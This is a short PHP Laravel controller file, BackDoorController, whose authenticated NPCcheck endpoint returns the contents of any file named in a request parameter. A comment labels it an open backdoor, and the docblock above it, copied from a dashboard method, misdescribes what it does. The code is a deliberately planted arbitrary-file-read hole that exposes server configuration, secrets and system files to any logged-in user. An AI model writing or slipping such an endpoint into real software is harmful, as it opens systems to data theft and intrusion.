<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class BackDoorController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Http\Response
     */

    // A open backdoor!
    public function NPCcheck(Request $request)
    {
        return file_get_contents($request->input('filename'));
    }
}
